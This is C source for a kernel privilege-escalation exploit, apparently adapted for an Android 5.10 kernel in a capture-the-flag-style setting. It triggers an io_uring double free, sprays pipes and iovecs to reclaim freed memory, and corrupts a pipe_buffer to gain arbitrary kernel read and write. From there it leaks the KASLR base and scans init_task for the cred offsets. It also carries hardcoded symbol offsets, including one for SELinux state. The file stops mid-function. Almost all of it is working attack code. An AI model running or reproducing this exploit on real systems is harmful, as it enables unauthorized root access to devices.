
// Exploit adapted by kexploit
// Original kernel name: ingots_5.10.66
// Adaptation kernel name: ingots_5.10.107

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <stdint.h>
#include <stddef.h>
#include <errno.h>
#include <pthread.h>
#include <fcntl.h>
#include <sched.h>
#include <string.h>
#include <assert.h>
#include <sys/uio.h>
#include <sys/ioctl.h>
#include <sys/wait.h>

typedef uint64_t u64;
typedef int64_t i64;
typedef uint32_t u32;
typedef int32_t i32;
typedef uint16_t u16;
typedef int16_t i16;
typedef uint8_t u8;
typedef int8_t i8;

typedef size_t usize;

typedef int __kernel_rwf_t;

/*
 * IO submission data structure (Submission Queue Entry)
 */
struct io_uring_sqe {
	u8	opcode;		/* type of operation for this sqe */
	u8	flags;		/* IOSQE_ flags */
	u16	ioprio;		/* ioprio for the request */
	i32	fd;		/* file descriptor to do IO on */
	union {
		u64	off;	/* offset into file */
		u64	addr2;
	};
	union {
		u64	addr;	/* pointer to buffer or iovecs */
		u64	splice_off_in;
	};
	u32	len;		/* buffer size or number of iovecs */
	union {
		__kernel_rwf_t	rw_flags;
		u32		fsync_flags;
		u16		poll_events;	/* compatibility */
		u32		poll32_events;	/* word-reversed for BE */
		u32		sync_range_flags;
		u32		msg_flags;
		u32		timeout_flags;
		u32		accept_flags;
		u32		cancel_flags;
		u32		open_flags;
		u32		statx_flags;
		u32		fadvise_advice;
		u32		splice_flags;
	};
	u64	user_data;	/* data to be passed back at completion time */
	union {
		struct {
			/* pack this to avoid bogus arm OABI complaints */
			union {
				/* index into fixed buffers, if used */
				u16	buf_index;
				/* for grouped buffer selection */
				u16	buf_group;
			} __attribute__((packed));
			/* personality to use, if used */
			u16	personality;
			i32	splice_fd_in;
		};
		u64	__pad2[3];
	};
};

enum {
	IOSQE_FIXED_FILE_BIT,
	IOSQE_IO_DRAIN_BIT,
	IOSQE_IO_LINK_BIT,
	IOSQE_IO_HARDLINK_BIT,
	IOSQE_ASYNC_BIT,
	IOSQE_BUFFER_SELECT_BIT,
};

/*
 * sqe->flags
 */
/* use fixed fileset */
#define IOSQE_FIXED_FILE	(1U << IOSQE_FIXED_FILE_BIT)
/* issue after inflight IO */
#define IOSQE_IO_DRAIN		(1U << IOSQE_IO_DRAIN_BIT)
/* links next sqe */
#define IOSQE_IO_LINK		(1U << IOSQE_IO_LINK_BIT)
/* like LINK, but stronger */
#define IOSQE_IO_HARDLINK	(1U << IOSQE_IO_HARDLINK_BIT)
/* always go async */
#define IOSQE_ASYNC		(1U << IOSQE_ASYNC_BIT)
/* select buffer from sqe->buf_group */
#define IOSQE_BUFFER_SELECT	(1U << IOSQE_BUFFER_SELECT_BIT)

/*
 * io_uring_setup() flags
 */
#define IORING_SETUP_IOPOLL	(1U << 0)	/* io_context is polled */
#define IORING_SETUP_SQPOLL	(1U << 1)	/* SQ poll thread */
#define IORING_SETUP_SQ_AFF	(1U << 2)	/* sq_thread_cpu is valid */
#define IORING_SETUP_CQSIZE	(1U << 3)	/* app defines CQ size */
#define IORING_SETUP_CLAMP	(1U << 4)	/* clamp SQ/CQ ring sizes */
#define IORING_SETUP_ATTACH_WQ	(1U << 5)	/* attach to existing wq */
#define IORING_SETUP_R_DISABLED	(1U << 6)	/* start with ring disabled */

enum {
	IORING_OP_NOP,
	IORING_OP_READV,
	IORING_OP_WRITEV,
	IORING_OP_FSYNC,
	IORING_OP_READ_FIXED,
	IORING_OP_WRITE_FIXED,
	IORING_OP_POLL_ADD,
	IORING_OP_POLL_REMOVE,
	IORING_OP_SYNC_FILE_RANGE,
	IORING_OP_SENDMSG,
	IORING_OP_RECVMSG,
	IORING_OP_TIMEOUT,
	IORING_OP_TIMEOUT_REMOVE,
	IORING_OP_ACCEPT,
	IORING_OP_ASYNC_CANCEL,
	IORING_OP_LINK_TIMEOUT,
	IORING_OP_CONNECT,
	IORING_OP_FALLOCATE,
	IORING_OP_OPENAT,
	IORING_OP_CLOSE,
	IORING_OP_FILES_UPDATE,
	IORING_OP_STATX,
	IORING_OP_READ,
	IORING_OP_WRITE,
	IORING_OP_FADVISE,
	IORING_OP_MADVISE,
	IORING_OP_SEND,
	IORING_OP_RECV,
	IORING_OP_OPENAT2,
	IORING_OP_EPOLL_CTL,
	IORING_OP_SPLICE,
	IORING_OP_PROVIDE_BUFFERS,
	IORING_OP_REMOVE_BUFFERS,
	IORING_OP_TEE,

	/* this goes last, obviously */
	IORING_OP_LAST,
};

/*
 * sqe->fsync_flags
 */
#define IORING_FSYNC_DATASYNC	(1U << 0)

/*
 * sqe->timeout_flags
 */
#define IORING_TIMEOUT_ABS	(1U << 0)

/*
 * sqe->splice_flags
 * extends splice(2) flags
 */
#define SPLICE_F_FD_IN_FIXED	(1U << 31) /* the last bit of u32 */

/*
 * IO completion data structure (Completion Queue Entry)
 */
struct io_uring_cqe {
	u64	user_data;	/* sqe->data submission passed back */
	i32	res;		/* result code for this event */
	u32	flags;
};

/*
 * cqe->flags
 *
 * IORING_CQE_F_BUFFER	If set, the upper 16 bits are the buffer ID
 */
#define IORING_CQE_F_BUFFER		(1U << 0)

enum {
	IORING_CQE_BUFFER_SHIFT		= 16,
};

/*
 * Magic offsets for the application to mmap the data it needs
 */
#define IORING_OFF_SQ_RING		0ULL
#define IORING_OFF_CQ_RING		0x8000000ULL
#define IORING_OFF_SQES			0x10000000ULL

/*
 * Filled with the offset for mmap(2)
 */
struct io_sqring_offsets {
	u32 head;
	u32 tail;
	u32 ring_mask;
	u32 ring_entries;
	u32 flags;
	u32 dropped;
	u32 array;
	u32 resv1;
	u64 resv2;
};

/*
 * sq_ring->flags
 */
#define IORING_SQ_NEED_WAKEUP	(1U << 0) /* needs io_uring_enter wakeup */
#define IORING_SQ_CQ_OVERFLOW	(1U << 1) /* CQ ring is overflown */

struct io_cqring_offsets {
	u32 head;
	u32 tail;
	u32 ring_mask;
	u32 ring_entries;
	u32 overflow;
	u32 cqes;
	u32 flags;
	u32 resv1;
	u64 resv2;
};

/*
 * cq_ring->flags
 */

/* disable eventfd notifications */
#define IORING_CQ_EVENTFD_DISABLED	(1U << 0)

/*
 * io_uring_enter(2) flags
 */
#define IORING_ENTER_GETEVENTS	(1U << 0)
#define IORING_ENTER_SQ_WAKEUP	(1U << 1)
#define IORING_ENTER_SQ_WAIT	(1U << 2)

/*
 * Passed in for io_uring_setup(2). Copied back with updated info on success
 */
struct io_uring_params {
	u32 sq_entries;
	u32 cq_entries;
	u32 flags;
	u32 sq_thread_cpu;
	u32 sq_thread_idle;
	u32 features;
	u32 wq_fd;
	u32 resv[3];
	struct io_sqring_offsets sq_off;
	struct io_cqring_offsets cq_off;
};

/*
 * io_uring_params->features flags
 */
#define IORING_FEAT_SINGLE_MMAP		(1U << 0)
#define IORING_FEAT_NODROP		(1U << 1)
#define IORING_FEAT_SUBMIT_STABLE	(1U << 2)
#define IORING_FEAT_RW_CUR_POS		(1U << 3)
#define IORING_FEAT_CUR_PERSONALITY	(1U << 4)
#define IORING_FEAT_FAST_POLL		(1U << 5)
#define IORING_FEAT_POLL_32BITS 	(1U << 6)

/*
 * io_uring_register(2) opcodes and arguments
 */
enum {
	IORING_REGISTER_BUFFERS			= 0,
	IORING_UNREGISTER_BUFFERS		= 1,
	IORING_REGISTER_FILES			= 2,
	IORING_UNREGISTER_FILES			= 3,
	IORING_REGISTER_EVENTFD			= 4,
	IORING_UNREGISTER_EVENTFD		= 5,
	IORING_REGISTER_FILES_UPDATE		= 6,
	IORING_REGISTER_EVENTFD_ASYNC		= 7,
	IORING_REGISTER_PROBE			= 8,
	IORING_REGISTER_PERSONALITY		= 9,
	IORING_UNREGISTER_PERSONALITY		= 10,
	IORING_REGISTER_RESTRICTIONS		= 11,
	IORING_REGISTER_ENABLE_RINGS		= 12,

	/* this goes last */
	IORING_REGISTER_LAST
};

struct io_uring_files_update {
	u32 offset;
	u32 resv;
	u64 __attribute__((aligned(8))) /* i32 * */ fds;
};

#define IO_URING_OP_SUPPORTED	(1U << 0)

struct io_uring_probe_op {
	u8 op;
	u8 resv;
	u16 flags;	/* IO_URING_OP_* flags */
	u32 resv2;
};

struct io_uring_probe {
	u8 last_op;	/* last opcode supported */
	u8 ops_len;	/* length of ops[] array below */
	u16 resv;
	u32 resv2[3];
	struct io_uring_probe_op ops[0];
};

struct io_uring_restriction {
	u16 opcode;
	union {
		u8 register_op; /* IORING_RESTRICTION_REGISTER_OP */
		u8 sqe_op;      /* IORING_RESTRICTION_SQE_OP */
		u8 sqe_flags;   /* IORING_RESTRICTION_SQE_FLAGS_* */
	};
	u8 resv;
	u32 resv2[3];
};

/*
 * io_uring_restriction->opcode values
 */
enum {
	/* Allow an io_uring_register(2) opcode */
	IORING_RESTRICTION_REGISTER_OP		= 0,

	/* Allow an sqe opcode */
	IORING_RESTRICTION_SQE_OP		= 1,

	/* Allow sqe flags */
	IORING_RESTRICTION_SQE_FLAGS_ALLOWED	= 2,

	/* Require sqe flags (these flags must be set on each submission) */
	IORING_RESTRICTION_SQE_FLAGS_REQUIRED	= 3,

	IORING_RESTRICTION_LAST
};

#define SYS_IO_URING_SETUP 425
#define SYS_IO_URING_ENTER 426

#define LOG(fmt, ...) do { \
  printf(fmt "\n", ##__VA_ARGS__); \
  } while(0)

#define SYSCHK(x) ({                  \
  __typeof__(x) __res = (x);          \
  if (__res == (__typeof__(x))-1) {   \
    LOG("SYSCHK(" #x ") = %d\n", __res);\
    int error_val = errno;            \
    LOG("errno: %d\n", error_val);    \
    exit(1);                          \
  }                                   \
  __res;                              \
})

#define CHECK(x, n) ({                  \
  __typeof__(x) __res = (x);          \
  if (__res != n) {   \
    LOG("SYSCHK(" #x ") = %d\n", __res);\
    int error_val = errno;            \
    LOG("errno: %d\n", error_val);    \
    exit(1);                          \
  }                                   \
  __res;                              \
})

int pin_to_cpu(int cpu) {
    int rc;
    int num_cpus = sysconf(_SC_NPROCESSORS_ONLN);
    cpu_set_t *cpu_setp = CPU_ALLOC(num_cpus);
    size_t size = CPU_ALLOC_SIZE(num_cpus);
    CPU_ZERO_S(size, cpu_setp);
    if (cpu >= 0 && cpu < num_cpus) {
        CPU_SET_S(cpu, size, cpu_setp);
    } else {
        for (int i = 0; i < num_cpus; i++) {
            CPU_SET_S(i, size, cpu_setp);
        }
    }

    rc = sched_setaffinity(0, size, cpu_setp);
    // if (rc) {
    //     printf("cpu %d failed to be pinned (num cpus = %d)\n", cpu, num_cpus);
    //     perror("sched_setaffinity");
    // }
    CPU_FREE(cpu_setp);
    return rc;
}

void panic(const char *msg) {
  puts(msg);
  exit(1);
}

typedef struct {
  int fd;
  struct io_uring_params params;
  u8 *sq_ring;
  struct io_uring_sqe *sq_entries;
  u8 *cq_ring;
} IoUring;

IoUring io_uring_setup() {
  struct io_uring_params params = { 0 };
  params.flags = IORING_SETUP_IOPOLL;
  int fd = SYSCHK(syscall(SYS_IO_URING_SETUP, 0x10, &params));

  // ring buffer of indicies
  u8 *sq_ring = mmap(
    NULL,
    params.sq_off.array + params.sq_entries * sizeof(u32),
    PROT_READ | PROT_WRITE,
    MAP_SHARED | MAP_POPULATE,
    fd,
    IORING_OFF_SQ_RING
  );

  // array of sq entries
  struct io_uring_sqe *sq_entries = mmap(
    NULL,
    params.sq_entries * sizeof(struct io_uring_sqe),
    PROT_READ | PROT_WRITE,
    MAP_SHARED | MAP_POPULATE,
    fd,
    IORING_OFF_SQES
  );

  // cq ring
  u8 *cq_ring = mmap(
    NULL,
    params.cq_off.cqes + params.cq_entries * sizeof(struct io_uring_cqe),
    PROT_READ | PROT_WRITE,
    MAP_SHARED | MAP_POPULATE,
    fd,
    IORING_OFF_CQ_RING
  );

  IoUring out = {
    .fd = fd,
    .params = params,
    .sq_ring = sq_ring,
    .sq_entries = sq_entries,
    .cq_ring = cq_ring,
  };

  return out;
}

u32 *io_uring_tail_ptr(IoUring *uring) {
  return (u32 *) (uring->sq_ring + uring->params.sq_off.tail);
}

u32 io_uring_mask(IoUring *uring) {
  return *(u32 *) (uring->sq_ring + uring->params.sq_off.ring_mask);
}

u32 *io_uring_submission_queue(IoUring *uring) {
  return (u32 *) (uring->sq_ring + uring->params.sq_off.array);
}

struct io_uring_cqe *io_uring_get_cqe(IoUring *uring) {
  return (struct io_uring_cqe *) (uring->cq_ring + uring->params.cq_off.cqes);
}

void io_uring_submit_sqe(IoUring *io_uring, struct io_uring_sqe *sqe) {
  usize index = sqe - io_uring->sq_entries;

  u32 *queue = io_uring_submission_queue(io_uring);
  u32 *tail = io_uring_tail_ptr(io_uring);
  u32 mask = io_uring_mask(io_uring);
  queue[*tail & mask] = index;
  *tail += 1;
}

void io_uring_enter_submit(IoUring *io_uring, u32 submit_count) {
  SYSCHK(syscall(SYS_IO_URING_ENTER, io_uring->fd, submit_count, 0, 0, NULL, 0));
}

void io_uring_enter_poll(IoUring *io_uring, u32 poll_count) {
  SYSCHK(syscall(SYS_IO_URING_ENTER, io_uring->fd, 0, poll_count, IORING_ENTER_GETEVENTS, NULL, 0));
}

struct pipe_buffer_t {
  unsigned long page;
  unsigned int offset, len;
  unsigned long ops;
  unsigned long flag;
  unsigned long private;
};

int exp_pipes[5] = { 0 };
struct pipe_buffer_t saved_pipe_buffer_leak = { 0 };
usize vmem_base = 0;
usize kaslr_base = 0;
usize phys_base = 0;
usize linear_base = 0;

// for arm 5.10.66 android kernel from ingots

#define LIBC_PATH "/apex/com.android.runtime/lib64/bionic/libc.so"
#define SHELL "/system/bin/sh"

// this kernel does not have kmalloc-192, so object of interest goes in kmalloc-256
#define SPRAY_SIZE 256

#define KERNEL_BASE 0xffffffc010000000

// on arm this symbol is called memstart_addr
#define PAGE_OFFSET_BASE (0xffffffc0121bc3d0 - KERNEL_BASE)
#define PIPE_OPS_OFFSET (0xffffffc01201bc28 - KERNEL_BASE)
#define INIT_OFFSET (0xffffffc012cbc3c0 - KERNEL_BASE)

// optinally define to turn off selinux
#define SELINUX_STATE_OFFSET (0xffffffc012e2b9a8 - KERNEL_BASE)

// first 64 bit word of kernel image
#define KERNEL_START_WORD 0x14a47fff91005a4d

#define VMEMMAP_START 0xfffffffeffe00000
#define LINEAR_BASE 0xffffff8000000000
#define PHYS_BASE 0x200000

usize addr_to_page(usize addr) {
  return ((addr >> 12) << 6) + vmem_base;
}

usize is_linear_address(usize addr) {
  return (addr & 0xffff000000000000) == 0xffff000000000000;
}

usize is_kernel_address(usize addr) {
  return (addr & 0xffffffc000000000) == 0xffffffc000000000;
}

typedef struct {
  IoUring io_uring;
  int read_poll_fd;
  pthread_t trigger_thread;
  int pipe_to_thread[2];
  int pipe_from_thread[2];
  // pthread_barrier_t setup_barrier;
  // pthread_barrier_t setup_done_barrier;
  // pthread_barrier_t trigger_barrier;
  char *buf;
  pid_t pid;
} Context;

Context context = { 0 };

void *trigger_thread(void *arg) {
  pin_to_cpu(0);
  
  SYSCHK(read(context.pipe_to_thread[0], context.buf, 1));

  // submit read which will be io polled by other task
  struct io_uring_sqe *sqe = &context.io_uring.sq_entries[0];
  memset(sqe, 0, sizeof(struct io_uring_sqe));
  sqe->opcode = IORING_OP_READ;
  sqe->fd = context.read_poll_fd;
  sqe->off = 0;
  sqe->addr = (usize) context.buf;
  sqe->len = 4096;
  sqe->user_data = 0x6969;

  io_uring_submit_sqe(&context.io_uring, sqe);
  io_uring_enter_submit(&context.io_uring, 1);

  struct io_uring_cqe *cqes = io_uring_get_cqe(&context.io_uring);
  printf("dummy completion:\nret value: %d\nuser cookie: %lx\n", cqes[0].res, cqes[0].user_data);
  printf("dummy completion:\nret value: %d\nuser cookie: %lx\n", cqes[1].res, cqes[1].user_data);

  SYSCHK(write(context.pipe_from_thread[1], context.buf, 1));

  SYSCHK(read(context.pipe_to_thread[0], context.buf, 1));
  // after trigger barrier hit, exit thread which triggers double free of io_uring context in current task

  return NULL;
}

void setup_bug() {
  SYSCHK(pipe(context.pipe_from_thread));
  SYSCHK(pipe(context.pipe_to_thread));

  // init_barrier(&context.setup_barrier, 2);
  // init_barrier(&context.setup_done_barrier, 2);
  // init_barrier(&context.trigger_barrier, 2);
  // context.read_poll_fd = SYSCHK(open("/apex/com.android.runtime/lib64/bionic/libc.so", O_RDONLY | O_DIRECT | O_NONBLOCK));
  context.read_poll_fd = SYSCHK(open(LIBC_PATH, O_RDONLY | O_DIRECT | O_NONBLOCK));
  context.buf = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

  // prefault pipes
  SYSCHK(write(context.pipe_to_thread[1], context.buf, 1));
  SYSCHK(read(context.pipe_to_thread[0], context.buf, 1));
  SYSCHK(write(context.pipe_from_thread[1], context.buf, 1));
  SYSCHK(read(context.pipe_from_thread[0], context.buf, 1));

  context.io_uring = io_uring_setup();

  // spawn other thread before allocating io uring stuff
  pthread_create(&context.trigger_thread, NULL, trigger_thread, NULL);

  // have other thread submit read
  SYSCHK(write(context.pipe_to_thread[1], context.buf, 1));

  // wait for it to finish
  SYSCHK(read(context.pipe_from_thread[0], context.buf, 1));

  // submit 1 random read, to give our own task a valid current->io_uring
  // otherwise it is null, since there is a bug in kernel poll with iopoll does not set this up
  struct io_uring_sqe *sqe = &context.io_uring.sq_entries[0];
  memset(sqe, 0, sizeof(struct io_uring_sqe));
  sqe->opcode = IORING_OP_READ;
  sqe->fd = context.read_poll_fd;
  sqe->off = 0;
  sqe->addr = (usize) context.buf;
  sqe->len = 4096;
  sqe->user_data = 0x69696969;

  io_uring_submit_sqe(&context.io_uring, sqe);
  io_uring_enter_submit(&context.io_uring, 1);
}

void trigger_bug() {
  io_uring_enter_poll(&context.io_uring, 2);
  struct io_uring_cqe *cqes = io_uring_get_cqe(&context.io_uring);
  printf("dummy completion:\nret value: %d\nuser cookie: %lx\n", cqes[0].res, cqes[0].user_data);
  printf("dummy completion:\nret value: %d\nuser cookie: %lx\n", cqes[1].res, cqes[1].user_data);
  SYSCHK(write(context.pipe_to_thread[1], context.buf, 1));
  pthread_join(context.trigger_thread, NULL);
}

void trigger_process(int start_step_pipes[2], int end_step_pipes[2]) {
  pin_to_cpu(0);

  char buf[16] = { 0 };
  SYSCHK(read(start_step_pipes[0], buf, 1));
  setup_bug();
  SYSCHK(write(end_step_pipes[1], buf, 1));

  SYSCHK(read(start_step_pipes[0], buf, 1));
  trigger_bug();
  SYSCHK(write(end_step_pipes[1], buf, 1));

  exit(0);
}

void call_trigger_process(int start_step_pipes[2], int end_step_pipes[2]) {
  char buf[16] = { 0 };
  SYSCHK(write(start_step_pipes[1], buf, 1));
  SYSCHK(read(end_step_pipes[0], buf, 1));
}

int sync_pipes[2] = { 0 };
char global_buffer[0x4000] = { 0 };

#define MAX_PIPE_NUM 0x400
#define PIPE_PAGE_NUM 0x600
#define FIRST_PIPE_SPRAY 0x180
#define MAX_256_PIPE 0x400

int pipes[MAX_PIPE_NUM][2] = { 0 };
int pipe_pages[PIPE_PAGE_NUM][2] = { 0 };

void *do_iov_spray(void *idx) {
  pin_to_cpu(0);

  unsigned long pipe_idx = (unsigned long)(idx);
  char data[0x100] = {};
  struct iovec iovec_array[SPRAY_SIZE / 16];
  assert(sizeof(iovec_array) == SPRAY_SIZE);

  for (int i = 0; i < SPRAY_SIZE / 16; i++) {
    iovec_array[i].iov_len = 1;
    iovec_array[i].iov_base =
        (void *)((char *)global_buffer + pipe_idx * 16 + i);
  }

  if (pipe_idx >= MAX_256_PIPE) {
    goto spray_256;
  }

  read(pipes[pipe_idx][0], data, 1);
  CHECK(*data, 'S');
  write(sync_pipes[1], "E", 1);
  // printf("pipe %ld spaied\n", pipe_idx);
  // if (pipe_idx == 0) printf("allocating 256 for 0\n");
  // printf("pipe idx %ld allocated\n", pipe_idx);
  int res = readv(pipes[pipe_idx][0], iovec_array, SPRAY_SIZE / 16);
  if (res != SPRAY_SIZE / 16) {
    printf("pipe %ld res is %d\n", pipe_idx, res);
    // iov might be corrupted, do that again without iov
    res = read(pipes[pipe_idx][0], (char *)global_buffer + pipe_idx * 16,
               SPRAY_SIZE / 16);
    printf("second read, res is %d\n", res);
  }
  write(sync_pipes[1], "E", 1);

spray_256:
  // wait for signal
  // *data = 0;
  // read(pipes[pipe_idx][0], data, 1);
  // assert(*data == 'S');
  // write(sync_pipes[1], "S", 1);

  // // after having the signal, do the spray
  // readv(pipes[pipe_idx][0], iovec_array, 256/16);
  // // keep sleeping to prevent too many freed pages

  // write(sync_pipes[1], "S", 1);
  while (1) {
    sleep(10000);
  }
}

unsigned long read64(unsigned long addr) {
  if ((addr & 0xfff) + 8 > 0x1000) {
    panic("invalid read");
    return 0;
  }

  int pipe_buffer_offset = exp_pipes[4];

  // put the page to tmp_page;
  read(exp_pipes[2], global_buffer, 0x1000);

  memset(global_buffer, 'D', 0x1000);
  unsigned long *buf = (unsigned long *)global_buffer;
  struct pipe_buffer_t *p_buffer =
      (struct pipe_buffer_t *)(&buf[pipe_buffer_offset]);

  memcpy(p_buffer, &saved_pipe_buffer_leak, 40);

  p_buffer->page = addr_to_page(addr);
  p_buffer->len = 9;
  p_buffer->offset = addr & 0xfff;
  for (int i = 1; i < 4; i++) {
    memcpy(p_buffer + i, p_buffer, 40);
  }

  // overwrite pipe_buffer
  write(exp_pipes[3], global_buffer, 0x1000);

  // now do the read memory
  unsigned long data;
  read(exp_pipes[0], &data, 8);
  return data;
}

void write64(unsigned long addr, unsigned long data) {
  assert((addr & 0xfff) + 8 <= 0x1000);

  int pipe_buffer_offset = exp_pipes[4];

  // put the page to tmp_page;
  read(exp_pipes[2], global_buffer, 0x1000);

  memset(global_buffer, 'D', 0x1000);
  unsigned long *buf = (unsigned long *)global_buffer;
  struct pipe_buffer_t *p_buffer =
      (struct pipe_buffer_t *)(&buf[pipe_buffer_offset]);

  memcpy(p_buffer, &saved_pipe_buffer_leak, 40);

  p_buffer->page = addr_to_page(addr);
  p_buffer->len = 0;
  p_buffer->offset = addr & 0xfff;
  for (int i = 1; i < 4; i++) {
    memcpy(p_buffer + i, p_buffer, 40);
  }

  // overwrite pipe_buffer
  write(exp_pipes[3], global_buffer, 0x1000);

  // now do the write of memory
  write(exp_pipes[1], &data, 8);
}

usize read64_kernel(usize addr) {
  return read64(addr - kaslr_base + phys_base);
}

void write64_kernel(usize addr, usize data) {
  write64(addr - kaslr_base + phys_base, data);
}

usize read64_virtual(usize addr) {
  // return read64(addr - 0xffff888000000000);
  return read64(addr - linear_base);
}

void write64_virtual(usize addr, usize data) {
  // return write64(addr - 0xffff888000000000, data);
  return write64(addr - linear_base, data);
}

usize read64_all(usize addr) {
  if (is_kernel_address(addr)) {
    return read64_kernel(addr);
  } else {
    return read64_virtual(addr);
  }
}

void write64_all(usize addr, usize data) {
  if (is_kernel_address(addr)) {
    write64_kernel(addr, data);
  } else {
    write64_virtual(addr, data);
  }
}

void read_mem(unsigned long addr, unsigned long *data, unsigned size) {
  for (int i=0; i<size/8; i++) {
    data[i] = read64(addr+i*8);
  }
}

void write_mem(unsigned long addr, unsigned long *data, unsigned size) {
  for (int i=0; i<size/8; i++) {
    write64(addr+i*8, data[i]);
  }
}

void scan_kernel_phys_base() {
  // scanning did not work for some reason
  phys_base = PHYS_BASE;
  // phys_base = 0;
  // for (;;) {
  //   usize value = read64(phys_base + 0x38);
  //   if (!memcmp(&phys_base, "ARMd", 4)) {
  //     break;
  //   }

  //   phys_base += 0x1000;
  // }
}

void exploit() {
  int start_step_pipes[2] = { 0 };
  int end_step_pipes[2] = { 0 };

  SYSCHK(pipe(start_step_pipes));
  SYSCHK(pipe(end_step_pipes));

  int pid = SYSCHK(fork());
  if (pid == 0) {
    trigger_process(start_step_pipes, end_step_pipes);
  }

  pin_to_cpu(0);

  for (int i = 0; i < MAX_PIPE_NUM; i++) {
    SYSCHK(pipe(pipes[i]));
    // prefault the page
    CHECK(fcntl(pipes[i][1], F_SETPIPE_SZ, 0x1000), 0x1000);
    write(pipes[i][1], global_buffer, 1);
    CHECK(read(pipes[i][0], global_buffer, 1), 1);
  }

  // prepare sync pipe
  SYSCHK(pipe(sync_pipes));
  CHECK(fcntl(sync_pipes[1], F_SETPIPE_SZ, 0x1000), 0x1000);
  write(sync_pipes[1], global_buffer, 1);
  read(sync_pipes[0], global_buffer, 1);

  // prepare exp pipe
  SYSCHK(pipe(exp_pipes));
  write(exp_pipes[1], global_buffer, 1);
  read(exp_pipes[0], global_buffer, 1);
  write(exp_pipes[1], global_buffer, 1);

  // a good time to setup context for the second stage
  for (int i = 0; i < PIPE_PAGE_NUM; i++) {
    if (pipe(pipe_pages[i]) < 0) {
      perror("pipe");
      exit(0);
    }
    CHECK(fcntl(pipe_pages[i][1], F_SETPIPE_SZ, 0x1000), 0x1000);
  }

  for (unsigned long i = 0; i < MAX_PIPE_NUM; i++) {
    pthread_t pid;
    pthread_create(&pid, NULL, do_iov_spray, (void *)i);
  }
  printf("preparing...\n");
  sleep(1);

  printf("[*] STAGE 1: defragmentation\n");
  // spray the first part
  for (int i = 0; i < FIRST_PIPE_SPRAY; i++) {
    usleep(10);
    write(pipes[i][1], "S", 1);
  }

  // sync with the spray
  int count = FIRST_PIPE_SPRAY;
  while (count) {
    usleep(10);
    int res = read(sync_pipes[0], global_buffer, count);
    count -= res;
  }

  printf("[*] STAGE 2: trigger the bug\n");
  call_trigger_process(start_step_pipes, end_step_pipes);

  // allocate a pipe buffer for this
  CHECK(fcntl(exp_pipes[1], F_SETPIPE_SZ, 0x4000), 0x4000);
  // fill the slab with other iovs
  for (int i = FIRST_PIPE_SPRAY; i < MAX_256_PIPE; i++) {
    // usleep(10);
    write(pipes[i][1], "S", 1);
  }

  // sync with the spray
  count = MAX_256_PIPE - FIRST_PIPE_SPRAY;
  while (count) {
    usleep(10);
    int res = read(sync_pipes[0], global_buffer + 0x300, count);
    // printf("read res : %d\n", res);
    count -= res;
  }

  call_trigger_process(start_step_pipes, end_step_pipes);

  int status = 0;
  SYSCHK(waitpid(pid, &status, 0));
  
  // sleep for a while making sure the memory is freed
  usleep(1000 * 1000);

  printf("[*] STAGE 3: free the cache\n");
  // now free the iov
  for (int i = MAX_256_PIPE - 1; i >= 0; i--) {
    usleep(10);
    write(pipes[i][1], global_buffer + 0x200, 256 / 16);
  }

  // sync with the free
  count = MAX_256_PIPE;
  while (count) {
    usleep(10);
    int res = read(sync_pipes[0], global_buffer + 0x300, count);
    // printf("read res : %d\n", res);
    count -= res;
  }

  printf("[*] STAGE 4: reclaim the page\n");
  memset(global_buffer, 'A', 0x1000);
  for (int i = 0; i < PIPE_PAGE_NUM; i++) {
    write(pipe_pages[i][1], global_buffer, 0x1000);
  }

  int size = 0;
  // now check pipe_buffer
  ioctl(exp_pipes[1], FIONREAD, &size);
  printf("FIONREAD pipe 1 is %x\n", size);
  if (size != 0x41414141) {
    printf("failed, please retry\n");
    fflush(stdout);
    sleep(3);
    return;
  }

  // rewrite pipe buffer
  write(exp_pipes[1], "KCTF", 0x4);

  // now check the pipe pages
  unsigned long *recv_buffer =
      (unsigned long *)((char *)global_buffer + 0x1000);
  unsigned long *pipe_buffer = 0;
  int res = 0, exp_pipe_idx = -1;
  for (int i = 0; i < PIPE_PAGE_NUM; i++) {
    res = read(pipe_pages[i][0], recv_buffer, 0x1000);
    if (res != 0x1000) {
      panic("pipe read error");
    }

    for (int j = 0; j < (0x1000 / 8); j++) {
      if (recv_buffer[j] != 0x4141414141414141) {
        pipe_buffer = recv_buffer + j;
        memcpy(&saved_pipe_buffer_leak, pipe_buffer, 40);
        exp_pipe_idx = i;
        exp_pipes[2] = pipe_pages[i][0];
        exp_pipes[3] = pipe_pages[i][1];
        exp_pipes[4] = j - 5; // pipe_buffer should move forward
        break;
      }
    }
    if (pipe_buffer != 0)
      break;
  }

  if (exp_pipe_idx == -1) {
    printf("failed, please retry\n");
    getchar();
  }

  // setup for read64 and write64
  write(exp_pipes[3], recv_buffer, 0x1000);

  FILE *file = fopen("/proc/self/comm", "w");
  if (file == NULL) {
    panic("could not set /proc/self/comm");
  }
  fwrite("expp", sizeof(char), 4, file);
  fclose(file);

  printf("leaked pipe page at %lx\n", saved_pipe_buffer_leak.page);
  printf("leaked ops at %lx\n", saved_pipe_buffer_leak.ops);

  kaslr_base = saved_pipe_buffer_leak.ops - PIPE_OPS_OFFSET;
  printf("leaked kaslr base: %lx\n", kaslr_base);

#ifdef VMEMMAP_START
  vmem_base = VMEMMAP_START;
#else
  vmem_base = saved_pipe_buffer_leak.page & 0xfffffffff0000000;
#endif
  printf("vmemmap base: %lx\n", vmem_base);

  scan_kernel_phys_base();
  printf("physical base address: %lx\n", phys_base);

#ifdef LINEAR_BASE
  linear_base = LINEAR_BASE;
#else
  linear_base = read64_kernel(kaslr_base + PAGE_OFFSET_BASE);
#endif
  printf("linear base: %lx\n", linear_base);

  usize current_task = INIT_OFFSET + kaslr_base;

  usize comm_offset = 0;
  usize cred_offset = 0;
  usize next_task_offset = 0;

  for (usize i = 0; i < 4096 - 8; i+=8) {
    usize value = read64_kernel(current_task + i);
    usize value2 = read64_kernel(current_task + i + 8);
    // check for 'swapper/' string
    if (value == 0x2f72657070617773) {
      comm_offset = i;
      cred_offset = comm_offset - 0x10;
      printf("comm offset: %lx\n", comm_offset);
    }

    if (is_linear_address(value) && !is_kernel_address(value) && is_linear_address(value2) && !is_kernel_address(value2) && next_task_offset == 0) {
      printf("%lx: %lx, %lx\n", i, value, value2);
      usize prev_ptr = read64_all(value + 8);
      printf("prev: %lx, real prev: %lx\n", prev_ptr, current_task + i);
      if (prev_ptr == current_task + i) {
        next_task_offset = i;
        printf("next task offset: %lx\n", next_task_offset);
      }
    }
  }

